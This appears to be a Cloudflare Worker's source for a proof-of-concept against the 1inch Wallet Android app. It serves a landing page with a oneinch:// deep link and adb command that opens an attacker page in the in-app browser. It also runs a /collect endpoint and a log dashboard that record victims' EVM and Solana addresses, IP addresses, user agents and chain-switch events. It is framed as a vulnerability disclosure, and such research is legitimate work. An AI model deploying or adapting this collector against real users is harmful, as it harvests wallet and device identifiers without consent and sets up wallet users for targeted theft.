import { POC_HTML } from "./poc.js";

const VIEW_TOKEN = "poclogs";
const TTL = 172800;

export default {
  async fetch(request, env) {
    const url  = new URL(request.url);
    const path = url.pathname;

    if (path === "/collect" && request.method === "POST") {
      const body = await request.json().catch(() => null);
      if (!body || !body.session) return json({ ok: false, error: "bad payload" }, 400);

      body._ip   = request.headers.get("cf-connecting-ip") || null;
      body._recv = new Date().toISOString();

      const events = Array.isArray(body.events) ? body.events : [];

      await env.LOGS.put("sess:" + body.session, JSON.stringify(body), {
        expirationTtl: TTL,
        metadata: summarize(body, events),
      });

      return json({ ok: true, session: body.session, n: events.length });
    }

    const authed = url.search.includes(VIEW_TOKEN);

    if (path === "/logs.json") {
      if (!authed) return json({ error: "unauthorized" }, 401);
      return json(await listSummaries(env));
    }

    if (path === "/logs/full.json") {
      if (!authed) return json({ error: "unauthorized" }, 401);
      return json(await listFull(env));
    }

    if (path === "/logs/clear") {
      if (!authed) return json({ error: "unauthorized" }, 401);
      return json({ cleared: await clearAll(env) });
    }

    if (path === "/logs") {
      if (!authed) return new Response("Add ?" + VIEW_TOKEN + " to the URL.", { status: 401 });
      return html(LOGS_HTML);
    }

    if (path === "/poc") return html(POC_HTML);

    const pocUrl  = "https://" + url.host + "/poc";
    const deepLink = "oneinch://open/w3browser?chain_id=1&link=" + encodeURIComponent(pocUrl);
    return html(landingPage(deepLink, url.host));
  },
};

async function allKeys(env) {
  let keys = [], cursor;
  do {
    const r = await env.LOGS.list({ prefix: "sess:", cursor, limit: 1000 });
    keys = keys.concat(r.keys);
    cursor = r.list_complete ? undefined : r.cursor;
  } while (cursor);
  keys.sort((a, b) => {
    const ta = (a.metadata && a.metadata.updated) || a.name;
    const tb = (b.metadata && b.metadata.updated) || b.name;
    return ta < tb ? -1 : 1;
  });
  return keys;
}

function summarize(p, events) {
  let addr=null, sol=null, chain=null, switches=0, signed=0, errors=0, rpc=0, maxMs=0;
  const hot = [];
  const switchedChains = [];

  for (const e of events) {
    if (!e || !e.type) continue;
    if (typeof e.ms === "number" && e.ms > maxMs) maxMs = e.ms;
    if (!addr && typeof e.address==="string" && e.address) addr = e.address;
    if (!addr && Array.isArray(e.accounts) && e.accounts[0])  addr = e.accounts[0];
    if (!addr && typeof e.addr==="string" && e.addr)          addr = e.addr;
    if (!addr && typeof e.evm==="string" && e.evm)            addr = e.evm;
    if (!addr && typeof e.coinbase==="string" && e.coinbase)  addr = e.coinbase;
    if (!sol  && e.type==="solana_connect" && e.address)      sol  = e.address;
    if (e.type==="eth_chainId" && e.chainId)                  chain = e.chainId;
    if (e.type==="wallet_switchEthereumChain" && e.switched)  { switches++; if (e.after && switchedChains.indexOf(e.after)===-1 && switchedChains.length<12) switchedChains.push(e.after); }
    if (e.type==="sig_result" && e.approved)                  signed++;
    if ((e.type==="eth_getBalance"||e.type==="eth_getTransactionCount"||e.type==="eth_blockNumber"||e.type==="eth_getCode")) rpc++;
    if (e.error || e.state==="error" || (e.type==="log" && e.state==="error")) errors++;
    if ((e.type==="eth_accounts"||e.type==="eth_requestAccounts") && Array.isArray(e.accounts) && e.accounts.length) push(hot,"eth_accounts");
    if (e.type==="url_template_leak"||e.type==="url_capture") push(hot,"url_leak");
    if (e.type==="solana_connect" && e.address)               push(hot,"solana");
    if (e.type==="wallet_switchEthereumChain" && e.switched)  push(hot,"chain_switch");
  }

  return {
    session: p.session, n: events.length, addr, sol, chain,
    switches, switchedChains, signed, rpc, errors, durMs: maxMs, hot,
    ua:      (p.ua||"").slice(0,120),
    ip:      p._ip || null,
    screen:  p._screen || null,
    lang:    p._lang || null,
    tz:      p._tz != null ? p._tz : null,
    opened:  p.opened || null,
    updated: p._recv || new Date().toISOString(),
  };
}

function push(arr, v) { if (arr.indexOf(v)===-1) arr.push(v); }

async function listSummaries(env) {
  const keys = await allKeys(env);
  return keys.map(k => k.metadata || { session: k.name.slice(5), n: 0 });
}

async function listFull(env) {
  const keys = await allKeys(env);
  const vals = await Promise.all(keys.map(k => env.LOGS.get(k.name)));
  return vals.map(v => { try { return JSON.parse(v); } catch(e) { return null; } }).filter(Boolean);
}

async function clearAll(env) {
  const keys = await allKeys(env);
  await Promise.all(keys.map(k => env.LOGS.delete(k.name)));
  return keys.length;
}

function rand() { return Date.now().toString(36)+"-"+Math.random().toString(16).slice(2,8); }

function html(body) {
  return new Response(body, {
    headers: { "Content-Type":"text/html; charset=UTF-8", "X-Content-Type-Options":"nosniff" },
  });
}

function json(obj, status) {
  return new Response(JSON.stringify(obj), {
    status: status||200,
    headers: { "content-type":"application/json", "cache-control":"no-store" },
  });
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
}

function landingPage(deepLink, host) {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>1inch Wallet — it connects to any site with no consent</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{--bg:#f3f2f2;--surface:#fff;--ink:#201e1d;--muted:#6f6b67;--faint:#a5a19d;
          --line:#201e1d;--hair:#d7d4d1;--accent:#ec3013;--accent-deep:#b31f0c;--tint:#fbe3df;
          --mono:ui-monospace,"SFMono-Regular","Roboto Mono",Menlo,Consolas,monospace;}
    *{box-sizing:border-box;}
    body{margin:0;padding:0 20px 64px;background:var(--bg);color:var(--ink);
         font-family:"Archivo",system-ui,sans-serif;font-size:15px;line-height:1.5;
         -webkit-font-smoothing:antialiased;}
    main{max-width:640px;margin:0 auto;}
    ::selection{background:var(--tint);}
    .mast{padding:34px 0 20px;border-bottom:2px solid var(--line);}
    .kicker{font-size:11px;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--accent-deep);}
    h1{margin:12px 0 0;font-size:32px;font-weight:800;line-height:1.08;letter-spacing:-.01em;}
    .lede{margin:14px 0 0;color:var(--muted);font-size:14.5px;max-width:56ch;line-height:1.6;}
    .grid{display:grid;grid-template-columns:repeat(2,1fr);margin-top:24px;border:2px solid var(--line);}
    .cell{padding:11px 13px;border-right:2px solid var(--line);border-top:2px solid var(--line);}
    .cell:nth-child(-n+2){border-top:0;} .cell:nth-child(2n){border-right:0;}
    .cell .k{font-size:10px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);}
    .cell .v{margin-top:3px;font-family:var(--mono);font-size:13px;word-break:break-all;}
    .cell .v.sev{color:var(--accent-deep);font-weight:700;}
    .steps{margin:32px 0 0;padding:0;list-style:none;counter-reset:s;border-top:2px solid var(--line);}
    .steps li{counter-increment:s;padding:14px 0 14px 42px;position:relative;border-bottom:1px solid var(--hair);font-size:14px;}
    .steps li::before{content:counter(s,decimal-leading-zero);position:absolute;left:0;top:14px;
                      font-family:var(--mono);font-size:12px;font-weight:700;color:var(--accent-deep);}
    .cta{margin-top:28px;}
    .btn{display:flex;align-items:center;justify-content:flex-start;gap:10px;width:100%;
         padding:17px 20px;font-family:"Archivo",system-ui,sans-serif;font-size:17px;font-weight:700;
         text-align:left;color:#fff;background:var(--accent);border:2px solid var(--accent);
         border-radius:0;cursor:pointer;text-decoration:none;}
    .btn:hover{background:var(--accent-deep);border-color:var(--accent-deep);}
    .btn .arrow{margin-left:auto;}
    :focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
    .alt{margin-top:12px;font-size:12.5px;color:var(--muted);}
    .alt a{font-family:var(--mono);color:var(--accent-deep);}
    .rawlink{margin-top:22px;padding:13px;background:var(--surface);border:2px solid var(--line);}
    .rawlink .k{font-size:10px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);}
    .rawlink .v{margin-top:5px;font-family:var(--mono);font-size:11.5px;word-break:break-all;line-height:1.55;}
    .adb-box{margin-top:22px;padding:13px;background:var(--surface);border:2px solid var(--line);}
    .adb-box .k{font-size:10px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);}
    .adb-box pre{margin:8px 0 0;font-family:var(--mono);font-size:11.5px;line-height:1.6;
                 white-space:pre-wrap;word-break:break-all;color:var(--ink);}
    footer{margin-top:40px;padding-top:16px;border-top:2px solid var(--line);
           color:var(--muted);font-size:11.5px;line-height:1.55;}
    @media(max-width:520px){h1{font-size:26px;}}
  </style>
</head>
<body>
<main>
  <header class="mast">
    <div class="kicker">PoC</div>
    <h1>A single 1inch deep link silently leaks a victim's wallet address and balances to any website,<br> with no consent prompt.</h1>
    <p class="lede">
      Any HTTPS site a users opens in the 1inch in-app browser gets the EVM and Solana
      providers injected into it with no connect prompt at all.
    </p>
    <div class="grid">
      <div class="cell"><div class="k">Target</div><div class="v">io.oneinch.android</div></div>
      <div class="cell"><div class="k">Version</div><div class="v">2.19.0-g</div></div>
      <div class="cell"><div class="k">Class</div><div class="v"> Improper Authorization / Missing per-origin dApp connection grant(CWE-285, CWE-862)</div></div>
      <div class="cell"><div class="k">Severity</div><div class="v sev">Medium · CVSS 5.4</div></div>
    </div>
  </header>

  <ol class="steps">
    <li>Install 1inch Wallet from the Play Store and set up a wallet (any amount).</li>
    <li>Open this page in a normal browser (Chrome, Brave) <strong>outside</strong> the app.</li>
    <li>Make sure you are not using do.aj7806280.workers.dev/poc or else you will get a popup called Malicious</li>
    <li>Tap the button below. The <code style="font-family:var(--mono)">oneinch://</code> deep link drops the PoC straight into the 1inch in-app browser. The only thing it asks for is a device unlock / fingerprint, and that is just unlocking the app, it is not me agreeing to connect to anything.</li>
    <li>A signature request shows up right away with no connect prompt before it. Reject it, the address and chain were already handed over before it even appeared.</li>
  </ol>

  <div class="cta">
    <a class="btn" id="open-btn" href="${escapeHtml(deepLink)}">
      Open PoC<span class="arrow">→</span>
    </a>
    <p class="alt">
      Already inside the 1inch's internal browser? Just open <a href="/poc">/poc</a> directly.
    </p>
  </div>

  <div class="rawlink">
    <div class="k">Deep link</div>
    <div class="v" id="raw-link">${escapeHtml(deepLink)}</div>
  </div>

  <div class="adb-box">
    <div class="k">ADB one-liner if you want to test on adb.</div>
    <pre id="adb-line">adb shell am start -a android.intent.action.VIEW \\
  -d '${escapeHtml(deepLink)}'</pre>
  </div>

  <script>

    (function () {
      var pocUrl = location.origin + "/poc";
      var deepLink = "oneinch://open/w3browser?chain_id=1&link=" + encodeURIComponent(pocUrl);
      var btn = document.getElementById("open-btn");
      var raw = document.getElementById("raw-link");
      var adb = document.getElementById("adb-line");
      if (btn) btn.setAttribute("href", deepLink);
      if (raw) raw.textContent = deepLink;
      if (adb) adb.textContent = "adb shell am start -a android.intent.action.VIEW \\\\\\n  -d '" + deepLink + "'";
    }());
  </script>

  <footer>
    The PoC only ever uses inert, expired, self
    directed payloads, and it moves no funds. Signing and transactions still
    require the native wallet confirmation screen.
  </footer>
</main>
</body>
</html>`;
}

const LOGS_HTML = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PoC evidence</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  :root{--bg:#f3f2f2;--surface:#fff;--ink:#201e1d;--muted:#6f6b67;--faint:#a5a19d;
        --line:#201e1d;--hair:#d7d4d1;--accent:#ec3013;--accent-deep:#b31f0c;--tint:#fbe3df;
        --amber:#b37400;--green:#2a7d3e;
        --mono:ui-monospace,"SFMono-Regular","Roboto Mono",Menlo,Consolas,monospace;}
  *{box-sizing:border-box;}
  body{margin:0;padding:0 20px 64px;background:var(--bg);color:var(--ink);
       font-family:"Archivo",system-ui,sans-serif;font-size:14px;line-height:1.5;
       -webkit-font-smoothing:antialiased;}
  main{max-width:1040px;margin:0 auto;}
  ::selection{background:var(--tint);}
  .bar{position:sticky;top:0;z-index:5;display:flex;align-items:center;gap:10px;flex-wrap:wrap;
       padding:14px 0 10px;margin-bottom:6px;background:var(--bg);border-bottom:2px solid var(--line);}
  h1{margin:0 14px 0 0;font-size:17px;font-weight:800;letter-spacing:-.005em;}
  .pill{padding:4px 9px;font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;border:1.5px solid var(--line);}
  .pill.on{background:var(--ink);color:var(--bg);}
  .pill.wait{color:var(--faint);border-color:var(--hair);}
  .spacer{flex:1;}
  button{font-family:"Archivo",system-ui,sans-serif;cursor:pointer;}
  .btn{padding:7px 12px;font-size:11px;font-weight:700;letter-spacing:.04em;
       background:transparent;color:var(--ink);border:1.5px solid var(--line);border-radius:0;}
  .btn:hover{background:var(--ink);color:var(--bg);}
  .btn.arm{background:var(--accent);color:#fff;border-color:var(--accent);}
  .btn.arm:hover{background:var(--accent-deep);border-color:var(--accent-deep);}
  :focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
  .toolbar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;padding:0 0 14px;margin-bottom:14px;border-bottom:1px solid var(--hair);}
  .filt{padding:5px 10px;font-size:10.5px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;
        border:1.5px solid var(--hair);color:var(--muted);background:transparent;}
  .filt.on{border-color:var(--line);color:var(--ink);background:var(--surface);}
  .filt .c{font-family:var(--mono);opacity:.7;margin-left:5px;}
  .search{flex:1;min-width:180px;padding:7px 10px;font-family:var(--mono);font-size:12px;
          border:1.5px solid var(--line);background:var(--surface);color:var(--ink);}
  .sess{margin-bottom:12px;border:2px solid var(--line);background:var(--surface);}
  .sess.hot{border-color:var(--accent);}
  .sess-head{display:grid;grid-template-columns:1fr auto;gap:12px;align-items:start;
             padding:12px 14px;cursor:pointer;}
  .sess-head:hover{background:var(--bg);}
  .sid{font-family:var(--mono);font-size:12px;font-weight:700;margin-bottom:7px;}
  .sfacts{display:flex;gap:7px;flex-wrap:wrap;}
  .fact{font-family:var(--mono);font-size:10.5px;padding:2px 7px;border:1px solid var(--hair);color:var(--muted);}
  .fact.leak{border-color:var(--accent);color:var(--accent-deep);font-weight:700;}
  .fact.amber{border-color:var(--amber);color:var(--amber);font-weight:700;}
  .fact.dark{border-color:var(--ink);color:var(--ink);font-weight:700;}
  .sright{text-align:right;font-family:var(--mono);font-size:10.5px;color:var(--faint);white-space:nowrap;}
  .caret{font-family:var(--mono);color:var(--faint);}
  .meta-line{margin-top:8px;font-family:var(--mono);font-size:10.5px;color:var(--faint);word-break:break-all;}
  .events{display:none;border-top:2px solid var(--line);}
  .sess.open .events{display:block;}
  .ev{padding:9px 14px;border-top:1px solid var(--hair);border-left:3px solid transparent;}
  .ev:first-child{border-top:0;}
  .ev.c-disclose{border-left-color:var(--accent);}
  .ev.c-switch{border-left-color:var(--accent);}
  .ev.c-rpc{border-left-color:var(--amber);}
  .ev.c-sig{border-left-color:var(--faint);}
  .ev.c-error{border-left-color:var(--ink);background:#faf7f6;}
  .ev.c-bounded{border-left-color:var(--green);}
  .ev-head{display:flex;align-items:baseline;gap:10px;}
  .ev-n{font-family:var(--mono);font-size:10px;color:var(--faint);width:34px;flex-shrink:0;}
  .ev-type{font-family:var(--mono);font-size:12px;font-weight:700;flex:1;word-break:break-all;}
  .ev-type.leak{color:var(--accent-deep);}
  .badge{font-family:var(--mono);font-size:9px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;
         padding:2px 6px;border:1px solid var(--hair);color:var(--muted);white-space:nowrap;}
  .badge.disclose,.badge.switch{border-color:var(--accent);color:var(--accent-deep);}
  .badge.rpc{border-color:var(--amber);color:var(--amber);}
  .badge.error{border-color:var(--ink);color:var(--ink);}
  .badge.bounded{border-color:var(--green);color:var(--green);}
  .ev-ms{font-family:var(--mono);font-size:10px;color:var(--faint);white-space:nowrap;}
  .ev-raw{margin:7px 0 0 34px;padding:9px 10px;background:var(--bg);font-family:var(--mono);
          font-size:11px;line-height:1.5;white-space:pre-wrap;word-break:break-all;border-left:2px solid var(--hair);}
  .empty{padding:40px 14px;color:var(--faint);text-align:center;}
</style>
</head>
<body>
<main>
  <div class="bar">
    <h1>PoC evidence</h1>
    <span class="pill" id="count">0 sessions</span>
    <span class="pill wait" id="stat">connecting…</span>
    <span class="spacer"></span>
    <button class="btn" id="expand">Expand all</button>
    <button class="btn" id="raw">Load full raw</button>
    <button class="btn" id="pause">Pause</button>
    <button class="btn" id="copy">Copy JSON</button>
    <button class="btn arm" id="clear">Clear all</button>
  </div>
  <div class="toolbar">
    <button class="filt on" data-f="all">All<span class="c" id="c-all">0</span></button>
    <button class="filt" data-f="disclose">Disclosure<span class="c" id="c-disclose">0</span></button>
    <button class="filt" data-f="switch">Switches<span class="c" id="c-switch">0</span></button>
    <button class="filt" data-f="rpc">RPC<span class="c" id="c-rpc">0</span></button>
    <button class="filt" data-f="sig">Signing<span class="c" id="c-sig">0</span></button>
    <button class="filt" data-f="error">Errors<span class="c" id="c-error">0</span></button>
    <input class="search" id="search" placeholder="filter events (method, address, chain, error text)…">
  </div>
  <div id="list"><div class="empty">Waiting for sessions…</div></div>
</main>
<script>
  var TOKEN = "poclogs";
  var HOT   = {url_leak:1,eth_accounts:1,solana:1,chain_switch:1};
  var LEAK_TYPES = {eth_accounts:1,eth_requestAccounts:1,eth_coinbase:1,
                    injection_proof:1,solana_connect:1,url_template_leak:1,url_capture:1};
  var paused=false, sig="", open={}, fullCache={}, summaries=[];
  var filter="all", search="";

  function esc(s){ return String(s).replace(/[&<>]/g,function(c){return{"&":"&amp;","<":"&lt;",">":"&gt;"}[c];}); }
  function q(sel){ return document.querySelector(sel); }
  function short(a){ return a?a.slice(0,6)+"…"+a.slice(-4):a; }

  function categorize(e){
    var t=e.type||"", st=e.state||"", title=e.title||"";
    if(e.error||st==="error") return "error";
    if(st==="rejected") return "bounded";
    if(t==="wallet_switchEthereumChain"||st==="switched"||/switch|sweep/i.test(title))
      return (e.switched||st==="switched")?"switch":"bounded";
    if(t==="solana_connect"||t==="eth_accounts"||t==="eth_requestAccounts"||t==="eth_coinbase"||
       t==="injection_proof"||t==="url_template_leak"||t==="url_capture"||st==="disclosed") return "disclose";
    if(t==="eth_getBalance"||t==="eth_getTransactionCount"||t==="eth_blockNumber"||t==="eth_getCode") return "rpc";
    if(t==="sig_result"||/sign|permit|order|transfer|message|listing/i.test(title)) return "sig";
    return "info";
  }
  var FILTER_MATCH = {
    all:function(){return true;},
    disclose:function(c){return c==="disclose";},
    switch:function(c){return c==="switch";},
    rpc:function(c){return c==="rpc";},
    sig:function(c){return c==="sig";},
    error:function(c){return c==="error";}
  };

  function facts(m){
    var f=[];
    if(m.addr)    f.push({t:"EVM "+short(m.addr),k:"leak"});
    if(m.sol)     f.push({t:"SOL "+short(m.sol),k:"leak"});
    if(m.chain)   f.push({t:"chain "+m.chain,k:""});
    if(m.switches)f.push({t:m.switches+" silent switch"+(m.switches>1?"es":""),k:"leak"});
    if(m.switchedChains&&m.switchedChains.length)f.push({t:m.switchedChains.join(" "),k:"leak"});
    if(m.rpc)     f.push({t:m.rpc+" RPC read"+(m.rpc>1?"s":""),k:"amber"});
    if(m.signed)  f.push({t:m.signed+" approved sig",k:""});
    if(m.errors)  f.push({t:m.errors+" error"+(m.errors>1?"s":""),k:"dark"});
    if(m.durMs)   f.push({t:"span "+(m.durMs>=1000?(m.durMs/1000).toFixed(1)+"s":m.durMs+"ms"),k:""});
    f.push({t:(m.n||0)+" events",k:""});
    return f;
  }

  function countMatches(events){
    if(!events)return 0;
    var n=0;
    events.forEach(function(e){
      var cat=categorize(e);
      if(!FILTER_MATCH[filter](cat))return;
      if(search){
        var hay=((e.type==="log"?(e.title||"log"):e.type)+" "+eventBody(e)).toLowerCase();
        if(hay.indexOf(search)===-1)return;
      }
      n++;
    });
    return n;
  }

  function render(){
    var list=q("#list");
    if(!summaries.length){list.innerHTML='<div class="empty">Waiting for sessions…</div>';return;}
    q("#count").textContent=summaries.length+(summaries.length===1?" session":" sessions");
    updateFilterCounts();
    var forceOpen=(filter!=="all")||!!search;
    var shown=0;
    var html=summaries.slice().reverse().map(function(m){
      var sid=m.session||"";
      if(forceOpen && countMatches(fullCache[sid])===0) return "";
      shown++;
      var hot=(m.hot||[]).some(function(h){return HOT[h];});
      var fhtml=facts(m).map(function(x){
        return '<span class="fact'+(x.k?" "+x.k:"")+'">'+esc(x.t)+'</span>';
      }).join("");
      var when=m.updated?m.updated.slice(11,19):"";
      var isOpen=open[sid]||forceOpen;
      var metaLine='ip '+esc(m.ip||"?")+' · opened '+esc((m.opened||"").slice(11,19))+(m.screen?' · '+esc(m.screen):'')+( m.lang?' · lang '+esc(m.lang):'')+' · '+esc(m.ua||"");
      var evHtml=isOpen?(fullCache[sid]?renderEvents(fullCache[sid]):'<div class="ev"><div class="ev-raw">Loading events…</div></div>'):"";
      return '<div class="sess'+(hot?" hot":"")+(isOpen?" open":"")+'" data-sid="'+esc(sid)+'">'+
        '<div class="sess-head" data-toggle="'+esc(sid)+'">'+
          '<div><div class="sid">'+esc(sid.slice(0,20))+'</div>'+
          '<div class="sfacts">'+fhtml+'</div>'+
          '<div class="meta-line">'+metaLine+'</div></div>'+
          '<div class="sright">'+esc(when)+'<br><span class="caret">'+(isOpen?"▾":"▸")+'</span></div>'+
        '</div>'+
        '<div class="events">'+evHtml+'</div>'+
      '</div>';
    }).join("");
    if(forceOpen && shown===0) html='<div class="empty">No events match this filter.</div>';
    list.innerHTML=html;
    document.querySelectorAll("[data-toggle]").forEach(function(el){
      el.onclick=function(){
        var sid=el.getAttribute("data-toggle");
        open[sid]=!open[sid];
        if(open[sid]&&!fullCache[sid])loadFull();
        else render();
      };
    });
  }

  function eventBody(e){
    if(e.type==="log") return e.detail||"";
    var raw={};
    for(var k in e){ if(k!=="n"&&k!=="type"&&k!=="ms"&&k!=="at"&&k!=="state"&&k!=="title") raw[k]=e[k]; }
    try{ return Object.keys(raw).length?JSON.stringify(raw,null,2):""; }catch(_){ return String(raw); }
  }

  function renderEvents(events){
    if(!events||!events.length)return '<div class="ev"><div class="ev-raw">No events.</div></div>';
    var out=events.map(function(e){
      var cat=categorize(e);
      if(!FILTER_MATCH[filter](cat)) return "";
      var label=e.type==="log"?(e.title||"log"):e.type;
      var body=eventBody(e);
      if(search){
        var hay=(label+" "+body).toLowerCase();
        if(hay.indexOf(search)===-1) return "";
      }
      var leak=LEAK_TYPES[e.type]||cat==="disclose"||cat==="switch";
      var badgeTxt=cat==="bounded"?"blocked":cat;
      return '<div class="ev c-'+cat+'">'+
        '<div class="ev-head">'+
          '<span class="ev-n">#'+e.n+'</span>'+
          '<span class="ev-type'+(leak?" leak":"")+'">'+esc(label)+'</span>'+
          '<span class="badge '+cat+'">'+esc(badgeTxt)+'</span>'+
          '<span class="ev-ms">'+(e.ms!=null?e.ms+"ms":"")+'</span>'+
        '</div>'+
        (body?'<div class="ev-raw">'+esc(body)+'</div>':'')+
      '</div>';
    }).join("");
    return out||'<div class="ev"><div class="ev-raw">No events match the current filter.</div></div>';
  }

  function updateFilterCounts(){
    var tot={all:0,disclose:0,switch:0,rpc:0,sig:0,error:0,info:0,bounded:0};
    Object.keys(fullCache).forEach(function(sid){
      (fullCache[sid]||[]).forEach(function(e){ var c=categorize(e); tot.all++; if(tot[c]!=null)tot[c]++; });
    });
    ["all","disclose","switch","rpc","sig","error"].forEach(function(f){
      var el=q("#c-"+f); if(el)el.textContent=tot[f]||0;
    });
  }

  function poll(){
    if(paused)return;
    fetch("/logs.json?"+TOKEN,{cache:"no-store"})
      .then(function(res){
        if(res.status===401){q("#stat").textContent="bad token";q("#stat").className="pill wait";return null;}
        return res.json();
      }).then(function(data){
        if(!data)return;
        q("#stat").textContent="live";q("#stat").className="pill on";
        var s=JSON.stringify(data.map(function(m){return[m.session,m.n,m.updated];}));
        if(s!==sig){ sig=s; summaries=data; loadFull(); }
      }).catch(function(){q("#stat").textContent="retrying…";q("#stat").className="pill wait";});
  }

  function loadFull(){
    return fetch("/logs/full.json?"+TOKEN,{cache:"no-store"})
      .then(function(r){return r.json();})
      .then(function(sessions){
        if(!Array.isArray(sessions))return;
        sessions.forEach(function(s){if(s&&s.session)fullCache[s.session]=s.events||[];});
        render();
      }).catch(function(){});
  }

  document.querySelectorAll(".filt").forEach(function(el){
    el.onclick=function(){
      filter=el.getAttribute("data-f");
      document.querySelectorAll(".filt").forEach(function(x){x.classList.remove("on");});
      el.classList.add("on");
      render();
    };
  });
  q("#search").oninput=function(){ search=this.value.toLowerCase().trim(); render(); };
  q("#expand").onclick=function(){
    var anyClosed=summaries.some(function(m){return !open[m.session];});
    summaries.forEach(function(m){open[m.session]=anyClosed;});
    this.textContent=anyClosed?"Collapse all":"Expand all";
    if(anyClosed)loadFull(); else render();
  };
  q("#raw").onclick=function(){var self=this;self.textContent="Loading…";loadFull().then(function(){self.textContent="Loaded";setTimeout(function(){self.textContent="Load full raw";},1400);});};
  q("#pause").onclick=function(){paused=!paused;this.textContent=paused?"Resume":"Pause";};
  q("#copy").onclick=function(){
    var self=this;
    fetch("/logs/full.json?"+TOKEN,{cache:"no-store"}).then(function(r){return r.text();}).then(function(t){
      if(navigator.clipboard)navigator.clipboard.writeText(t);
      self.textContent="Copied";setTimeout(function(){self.textContent="Copy JSON";},1400);
    });
  };
  q("#clear").onclick=function(){
    if(!confirm("Delete all logged sessions?"))return;
    fetch("/logs/clear?"+TOKEN).then(function(){sig="";summaries=[];fullCache={};open={};poll();});
  };

  poll();
  setInterval(poll,3000);
</script>
</body>
</html>`;